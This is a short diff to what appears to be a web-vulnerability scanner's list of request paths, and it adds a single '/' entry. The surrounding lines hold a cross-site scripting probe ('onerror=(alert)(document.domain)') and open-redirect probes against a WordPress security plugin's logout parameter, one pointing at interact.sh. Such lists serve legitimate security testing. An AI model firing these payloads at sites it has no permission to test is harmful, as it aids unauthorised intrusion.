@@ -229,3 +229,4 @@
 /properties-with-map/?status&keyword=%22%3E%3Cimg%20src=x%20onerror=(alert)(document.domain);//%22
 /?aiowpsec_do_log_out=1&al_additional_data=1
 /?aiowpsec_do_log_out=1&after_logout=https://interact.sh
+/
